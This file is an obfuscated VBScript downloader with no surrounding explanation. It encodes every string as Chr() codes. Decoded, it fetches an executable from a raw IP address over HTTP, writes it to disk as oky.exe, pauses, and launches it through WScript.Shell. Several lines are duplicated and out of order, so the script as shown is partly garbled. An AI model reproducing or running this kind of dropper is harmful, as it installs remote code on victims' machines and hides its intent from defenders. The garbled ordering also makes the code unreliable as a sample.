set oshell = wscript.createobject (Chr(87)+Chr(115)+Chr(99)+Chr(114)+Chr(105)+Chr(112)+Chr(116)+Chr(46)+Chr(115)+Chr(104)+Chr(101)+Chr(108)+Chr(108))
xPost.Open Chr(71)+Chr(69)+Chr(84),Chr(104)+Chr(116)+Chr(116)+Chr(112)+Chr(58)+Chr(47)+Chr(47)+Chr(49)+Chr(49)+Chr(57)+Chr(46)+Chr(49)+Chr(50)+Chr(55)+Chr(46)+Chr(49)+Chr(51)+Chr(48)+Chr(46)+Chr(49)+Chr(55)+Chr(56)+Chr(47)+Chr(118)+Chr(105)+Chr(112)+Chr(56)+Chr(46)+Chr(101)+Chr(120)+Chr(101),Chr(48)
xPost.Send()
Set sGet = CreateObject(Chr(65)+Chr(68)+Chr(79)+Chr(68)+Chr(66)+Chr(46)+Chr(83)+Chr(116)+Chr(114)+Chr(101)+Chr(97)+Chr(109))
sGet.Mode = Chr(51)
sGet.Type = Chr(49)
sGet.Open()
Set xPost = CreateObject(Chr(77)+Chr(105)+Chr(99)+Chr(114)+Chr(111)+Chr(115)+Chr(111)+Chr(102)+Chr(116)+Chr(46)+Chr(88)+Chr(77)+Chr(76)+Chr(72)+Chr(84)+Chr(84)+Chr(80))
xPost.Open Chr(71)+Chr(69)+Chr(84),Chr(104)+Chr(116)+Chr(116)+Chr(112)+Chr(58)+Chr(47)+Chr(47)+Chr(49)+Chr(49)+Chr(57)+Chr(46)+Chr(49)+Chr(50)+Chr(55)+Chr(46)+Chr(49)+Chr(51)+Chr(48)+Chr(46)+Chr(49)+Chr(55)+Chr(56)+Chr(47)+Chr(118)+Chr(105)+Chr(112)+Chr(56)+Chr(46)+Chr(101)+Chr(120)+Chr(101),Chr(48)
xPost.Send()
Set sGet = CreateObject(Chr(65)+Chr(68)+Chr(79)+Chr(68)+Chr(66)+Chr(46)+Chr(83)+Chr(116)+Chr(114)+Chr(101)+Chr(97)+Chr(109))
sGet.Mode = Chr(51)
sGet.Type = Chr(49)
sGet.Write(xPost.responseBody)
sGet.SaveToFile Chr(111)+Chr(107)+Chr(121)+Chr(46)+Chr(101)+Chr(120)+Chr(101),Chr(50)
wscript.sleep Chr(49)+Chr(48)+Chr(48)+Chr(48)+Chr(48)
oshell.run Chr(111)+Chr(107)+Chr(121)+Chr(46)+Chr(101)+Chr(120)+Chr(101)
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile Chr(111)+Chr(107)+Chr(121)+Chr(46)+Chr(101)+Chr(120)+Chr(101),Chr(50)
wscript.sleep Chr(49)+Chr(48)+Chr(48)+Chr(48)+Chr(48)
oshell.run Chr(111)+Chr(107)+Chr(121)+Chr(46)+Chr(101)+Chr(120)+Chr(101)
